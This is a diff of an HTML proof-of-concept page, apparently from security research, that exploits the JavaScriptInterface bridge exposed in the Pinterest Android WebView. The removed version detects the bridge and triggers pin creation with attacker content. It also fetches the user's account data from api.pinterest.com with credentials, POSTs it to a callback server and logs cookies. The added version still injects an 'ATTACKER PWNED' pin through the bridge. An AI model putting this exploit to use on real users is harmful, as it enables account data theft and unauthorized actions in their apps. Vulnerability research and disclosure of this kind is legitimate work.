@@ -1,1 +1,21 @@
-<!DOCTYPE html><html><head><meta charset='utf-8'><title>PT-M3 Attack Page</title></head><body><h2>PT-M3 Attack</h2><img src='https://images.unsplash.com/photo-1506905925346-21bda4d32df4?w=640&h=480' width='640' height='480' alt='img1'><img src='https://images.unsplash.com/photo-1501854140801-50d01698950b?w=640&h=480' width='640' height='480' alt='img2'><div id='s'>Running...</div><pre id='d'></pre><script>var CB='http://127.0.0.1:18765';var log=function(m){  document.getElementById('d').textContent+=m+'\n';  var x=new XMLHttpRequest();  x.open('GET',CB+'/log?m='+encodeURIComponent(m),true);x.send();};log('JS executed in: '+window.location.href);log('UA: '+navigator.userAgent);if(typeof window.JavaScriptInterface!=='undefined'){  log('[!] JavaScriptInterface FOUND - in Pinterest WebView!');  document.getElementById('s').innerHTML='<b style=color:red>EXPLOIT ACTIVE</b>';  var p=JSON.stringify({    thumb:[{url:'https://attacker.example.com/evil.jpg',x:0,y:0,width:640,height:480}],    meta:{url:'https://attacker.example.com',title:'Attacker Pin'}  });  log('[+] Calling onPinsLoaded...');  window.JavaScriptInterface.onPinsLoaded(p);  log('[+] onPinsLoaded() called - Pinterest pin-creation triggered with attacker content!');}else{  log('[-] JavaScriptInterface not present (not Phase-2 WebView yet)');  document.getElementById('s').textContent='Waiting for Phase-2 WebView';}log('[*] Fetching api.pinterest.com/v3/me/ with credentials...');fetch('https://api.pinterest.com/v3/me/',{credentials:'include',mode:'cors'}).then(function(r){return r.text();}).then(function(d){  log('[!] API data ('+d.length+' bytes): '+d.substring(0,300));  var x2=new XMLHttpRequest();  x2.open('POST',CB+'/stolen',true);  x2.setRequestHeader('Content-Type','text/plain');x2.send(d);}).catch(function(e){log('[*] fetch error/CORS: '+e);});log('[*] cookies on this origin: '+document.cookie);</script></body></html>
+<!DOCTYPE html>
+<html>
+<head><meta charset='utf-8'><title>PT-M3 Test</title></head>
+<body style="background:#fff;font-size:22px;padding:20px">
+<div id="s">Checking...</div>
+<img src="https://images.unsplash.com/photo-1506905925346-21bda4d32df4?w=640&h=480" width="300">
+<img src="https://images.unsplash.com/photo-1501854140801-50d01698950b?w=640&h=480" width="300">
+<script>
+if (typeof window.JavaScriptInterface !== 'undefined') {
+    document.body.style.background = 'red';
+    document.getElementById('s').textContent = 'EXPLOIT: JavaScriptInterface FOUND';
+    window.JavaScriptInterface.onPinsLoaded(JSON.stringify({
+        thumb:[{url:'https://ankitkanojiy.github.io/test_page/pwned.jpg',x:0,y:0,width:640,height:480}],
+        meta:{url:'https://ATTACKER-PWNED.example.com',title:'ATTACKER PWNED PIN'}
+    }));
+} else if (typeof window !== 'undefined') {
+    document.body.style.background = 'yellow';
+    document.getElementById('s').textContent = 'JS ran — no JavaScriptInterface';
+}
+</script>
+</body>
